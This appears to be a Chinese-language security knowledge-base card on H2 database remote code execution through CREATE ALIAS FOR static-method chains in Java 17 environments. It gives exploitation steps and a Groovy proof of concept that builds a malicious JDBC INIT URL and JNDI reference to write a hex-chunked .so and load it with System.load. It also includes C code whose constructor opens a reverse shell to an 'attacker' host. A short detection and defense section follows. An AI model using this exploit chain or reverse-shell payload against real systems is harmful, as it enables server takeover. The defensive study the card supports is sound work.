---
id: web-java-component-h2-create-alias-file-write-system-load
title: H2 CREATE ALIAS 受限环境 RCE：File.createTempFile + FileUtils 分块写 .so，MethodUtils 反射 System.load
type: scenario
domain: web
path: web/java/component
technique: h2-create-alias-file-write-system-load
tags:
- java
- h2
- jdbc
- create-alias
- file-write
- system-load
- rce
- java-17
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V503
  verified_at: '2026-11-11T03:25:38+08:00'
  notes: 已对照原文与19/19图核对：CREATE ALIAS AS 源码编译（无 javac，图14）、CREATE TRIGGER JavaScript（Java 15+ 移除 Nashorn，图12）、Groovy 缺失（图13）失败与原文一致；CREATE ALIAS FOR '类.静态方法'（图15）、File.createTempFile+FileUtils.writeByteArrayToFile+MethodUtils.invokeMethod/invokeExactStaticMethod+Class.forName+System.load 的 PoC 与原文 payload 一致；JAVA_OBJECT 可序列化与不能与 VARCHAR 互转的约束（图16）、500 字符分块与 INIT \; 多语句与原文一致。未在未授权目标执行。
url: /docs/web/java/component/web-java-component-h2-create-alias-file-write-system-load/
draft: false
kb_aliases:
- H2 CREATE ALIAS FOR 文件写入
- FileUtils.writeByteArrayToFile H2
- MethodUtils invokeExactStaticMethod
- System.load 加载 .so
- JAVA_OBJECT 类型约束绕过
- H2 2.1.214 RCE
---

## 一句话结论

当 H2 只能走 `CREATE ALIAS ... FOR '类.静态方法'`、且目标 Java 17 没有 javac/Nashorn/Groovy 时，可以用一组 classpath 内的静态方法拼出“写文件 + 加载动态库”的 RCE：`java.io.File.createTempFile` 建临时文件、`org.apache.commons.io.FileUtils.writeByteArrayToFile` 按 500 字符分块追加写入 hex 解码后的 `.so`、`org.apache.commons.beanutils.MethodUtils.invokeMethod` 调 `getAbsolutePath` 取路径、`Class.forName('java.lang.System')` + `MethodUtils.invokeExactStaticMethod` 调 `System.load`；关键在于 H2 的 `JAVA_OBJECT` 只接受 Serializable 对象且不能与 VARCHAR 互转，因此所有中间值必须通过返回 `Object` 的静态方法桥接。

## 原理

- **CREATE ALIAS 的两种形式**：`CREATE ALIAS name AS $$ Java 源码 $$` 需要 H2 调用 javac 动态编译（目标 JRE 无 javac 时失败）；`CREATE ALIAS name FOR 'class.staticMethod(签名)'` 直接把别名绑定到 classpath 中已编译的公共静态方法（类与方法都必须 public）。受限环境只能用后者。
- **为什么常见 RCE 手法失效**：Java 15+ 移除了 Nashorn（`CREATE TRIGGER ... AS $$//javascript$$` 语法/运行时失败）；classpath 无 Groovy（`@groovy.transform.ASTTest` 失败）；无 javac（`CREATE ALIAS AS` 源码编译失败）。因此必须找现成的静态方法组合。
- **写文件原语**：`java.io.File.createTempFile(String prefix, String suffix)` 返回 File（前缀至少 3 字符）；`org.apache.commons.io.FileUtils.writeByteArrayToFile(File, byte[], boolean append)` 把字节写入 File（append=true 追加）；`.so` 转 hex 后按 500 字符分块，避免单条 SQL 过长。
- **实例方法桥接**：`CREATE ALIAS` 只能绑定静态方法，取临时文件绝对路径需要调用 File 的实例方法；`org.apache.commons.beanutils.MethodUtils.invokeMethod(Object, String, Object)` 是静态方法且内部按方法名反射调用实例方法，返回 `Object`（实际为 String）。
- **H2 类型系统约束**：Java `java.lang.Object` 对应 H2 `JAVA_OBJECT`，要求对象可序列化（`Runtime` 未实现 Serializable，`getRuntime()` 存入变量会报错）；且 H2 不支持 `JAVA_OBJECT` 与 `VARCHAR` 之间的隐式转换，`INVOKE_METHOD` 返回的 Object 不能直接当 String 传给 `System.load(String)`。解决办法是用一个参数类型为 `java.lang.Object` 的静态方法桥接：`MethodUtils.invokeExactStaticMethod(Class, String, Object)`，把路径对象传进去间接调用 `System.load`。
- **完整执行**：`INIT=` 支持多语句（以 `\;` 分隔）；`DROP ALIAS IF EXISTS` 清理、`CREATE ALIAS ... FOR` 绑定原语、`SET @file=CREATE_FILE(...)`、循环 `CALL WRITE_FILE(@file, X'...', TRUE)`、`SET @path=INVOKE_METHOD(@file,'getAbsolutePath',NULL)`、`SET @clazz=CLASS_FOR_NAME('java.lang.System')`、`CALL INVOKE_STATIC_METHOD(@clazz,'load',@path)`。动态库的构造函数（`__attribute__((constructor))`）在 `System.load` 时执行，完成命令执行/反弹 shell。
- **触发方式**：把上述 SQL 放进 H2 JDBC URL 的 `INIT`，再由 JNDI 本地工厂（如 HikariJNDIFactory/ViburDBCPObjectFactory）或任何可控 JDBC URL 的入口发起连接。
- **边界**：需要目标 classpath 有 commons-io 与 commons-beanutils（SolarWinds SEM 自带）；H2 版本支持 `CREATE ALIAS ... FOR`（文章环境 h2-2.1.214）；`SecurityManager`/SQL 限制、只读文件系统、无 `System.load` 权限时失败；仅 `JAVA_OBJECT` 可序列化对象可用。

## 触发条件

- 可控制 H2 JDBC URL（`INIT=`）或在 H2 中执行任意 SQL。
- classpath 含 `commons-io`、`commons-beanutils`，且 H2 版本支持 `CREATE ALIAS ... FOR`。
- 目标为 JRE/JDK（无 javac）、无 JS 引擎/Groovy 等动态编译能力。
- 可向临时目录写文件并执行 `System.load`（进程权限允许加载本地库）。
- 仅限授权测试与防御验证。

## 利用步骤

1. 编译本地库：`gcc -shared -fPIC exp.c -o exp.so`，构造函数内执行反弹 shell/命令。
2. 将 `.so` 转 hex，按 500 字符分块。
3. 通过入口（JNDI→HikariJNDIFactory、可控 JDBC URL、SQL 注入等）构造 H2 URL：`jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=<语句用 \; 连接>\;`。
4. SQL 中依次 `DROP ALIAS`、`CREATE ALIAS` 绑定 `CREATE_FILE`/`WRITE_FILE`/`INVOKE_METHOD`/`INVOKE_STATIC_METHOD`/`CLASS_FOR_NAME`。
5. `SET @file=CREATE_FILE('test','.so')`，循环 `CALL WRITE_FILE(@file, X'<chunk>', TRUE)` 写入全部块。
6. `SET @path=INVOKE_METHOD(@file,'getAbsolutePath',NULL)`；`SET @clazz=CLASS_FOR_NAME('java.lang.System')`；`CALL INVOKE_STATIC_METHOD(@clazz,'load',@path)`。
7. `System.load` 触发 `.so` 构造函数，命令执行/反弹 shell。

## PoC

Groovy 生成 H2 URL（文章 payload 整理）：

```groovy
def list = []
list << "DROP ALIAS IF EXISTS CREATE_FILE"
list << "DROP ALIAS IF EXISTS WRITE_FILE"
list << "DROP ALIAS IF EXISTS INVOKE_METHOD"
list << "DROP ALIAS IF EXISTS INVOKE_STATIC_METHOD"
list << "DROP ALIAS IF EXISTS CLASS_FOR_NAME"
list << "CREATE ALIAS CREATE_FILE FOR 'java.io.File.createTempFile(java.lang.String, java.lang.String)'"
list << "CREATE ALIAS WRITE_FILE FOR 'org.apache.commons.io.FileUtils.writeByteArrayToFile(java.io.File, byte[], boolean)'"
list << "CREATE ALIAS INVOKE_METHOD FOR 'org.apache.commons.beanutils.MethodUtils.invokeMethod(java.lang.Object, java.lang.String, java.lang.Object)'"
list << "CREATE ALIAS INVOKE_STATIC_METHOD FOR 'org.apache.commons.beanutils.MethodUtils.invokeExactStaticMethod(java.lang.Class, java.lang.String, java.lang.Object)'"
list << "CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)'"

list << "SET @file=CREATE_FILE('test', '.so')"
def content = new File('/path/exp.so').bytes.encodeHex().toString()
def data = content.toList().collate(500)*.join()
for (d in data) { list << "CALL WRITE_FILE(@file, X'$d', TRUE)" }
list << "SET @path=INVOKE_METHOD(@file, 'getAbsolutePath', NULL)"
list << "SET @clazz=CLASS_FOR_NAME('java.lang.System')"
list << "CALL INVOKE_STATIC_METHOD(@clazz, 'load', @path)"

def url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=${list.join('\\;')}\\;"
def ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null)
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"))
ref.add(new StringRefAddr("jdbcUrl", url))
return ref
```

`.so` 示例：

```c
#include <stdlib.h>
__attribute__ ((__constructor__)) void preload (void){
    system("bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'");
}
```

说明：以上为文章代码片段整理，未在未授权目标执行。

## 变体与关联

- **同类 H2 受限 RCE**：不写文件、改用 `ClassPathXmlApplicationContext` + 远程 XML 的静态方法组合见 [[web-java-component-h2-jre-only-create-alias-static-method-rce]]；本卡是“写 .so + System.load”的另一条 sink，并补充了 `JAVA_OBJECT`/VARCHAR 类型桥接细节。
- **H2 INIT 与动态编译限制**：INIT 单语句/RUNSCRIPT 与 JS/Groovy 触发器的取舍见 [[web-java-component-h2-init-single-statement-trace-stacked-alias-groovy]]。
- **JNDI→JDBC 入口**：HikariJNDIFactory 见 [[web-java-deserialization-jndi-hikaricp-metricregistry-hikarijndifactory]]；ViburDBCPObjectFactory 见 [[web-java-deserialization-jndi-viburdbcp-objectfactory-jdbc]]。
- **来源链**：CVE-2024-0692 SolarWinds SEM AMF 链见 [[web-java-component-solarwinds-sem-blazeds-amf-deserialization-wildcard-validator]]。
- **边界**：H2 2.1.214 环境验证；不同 H2 版本 CREATE ALIAS 行为/类型映射可能差异；commons-io/beanutils 缺失或无写权限时失败。

## 检测与防御

- **JDBC/SQL**：H2 URL 出现 `INIT=`、`CREATE ALIAS ... FOR`、`MethodUtils`、`FileUtils`、`System.load`、`class.forName`；`X'...'` 大段 hex 分块写入；`\;` 堆叠多语句。
- **主机**：Java 进程在临时目录创建 `.so` 并调用 `System.load`/`dlopen`；随后出现 `bash -i`/`/dev/tcp` 或异常子进程；H2 驱动加载与连接池初始化异常栈（HikariPool → H2 INIT）。
- **防御**：禁止不可信 JDBC URL/INIT；H2 仅用于测试或移除；数据库 URL 白名单与属性过滤；限制临时目录可执行文件与 `System.load`；JNDI/LDAP 出站管控；对 `CREATE ALIAS`/`RUNSCRIPT` 做审计与权限限制。
